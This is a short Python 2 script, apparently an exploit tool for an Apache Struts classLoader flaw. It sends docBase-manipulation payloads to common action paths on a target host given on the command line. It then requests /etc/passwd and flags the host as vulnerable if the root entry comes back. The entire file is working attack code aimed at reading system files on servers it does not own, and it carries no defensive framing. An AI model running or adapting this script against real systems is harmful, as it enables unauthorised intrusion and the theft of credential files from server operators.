#!/usr/bin/env python
#coding:utf-8
#author: l137

import sys
import time
import urllib2

def exec_struts(url, link):
    date = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'}
    payload_0 ="""?class.classLoader.resources.dirContext.docBase=/"""
    payload_1 = """?class['classLoader'].resources.dirContext.docBase=/"""
    payload_2 = """/etc/passwd"""
    url_payload_0 = url+payload_0
    url_payload_1 = url+payload_1
    url_payload_2 = link+payload_2
    #print url_payload_0,url_payload_1,url_payload_2
    req_0 = urllib2.Request(url_payload_0,headers=headers)
    req_1 = urllib2.Request(url_payload_1,headers=headers)
    req_2 = urllib2.Request(url_payload_2,headers=headers)
    try:
        info0 = urllib2.urlopen(req_0,timeout=5).read()
        print info0
    except Exception,e:
        pass
    try:
        info1 = urllib2.urlopen(req_1,timeout=5).read()
    except Exception,e:
        pass
    try:
        info2 = urllib2.urlopen(req_2,timeout=5).read()
        if "root:x:0:0:root" in info2:
            return date,link,"1","vulner~wakaka"
    except Exception,e:
        pass

        #print info_result
    
   

def execMain(link):
    #action链接列表
    actionlist = ["/index.action","/test.action","/home.action","/login.do","/index.do"]
    urllist = []
    for action in actionlist:
        urllist.append(link+action)
    for url in urllist:
        print exec_struts(url, link)

if __name__ == "__main__":
    if len(sys.argv) == 3:        
        target = sys.argv[1]
        port = sys.argv[2]
        if port == 443:
            url = "https://"+target
        else:
            url = "http://"+target+":"+port
        execMain(url)
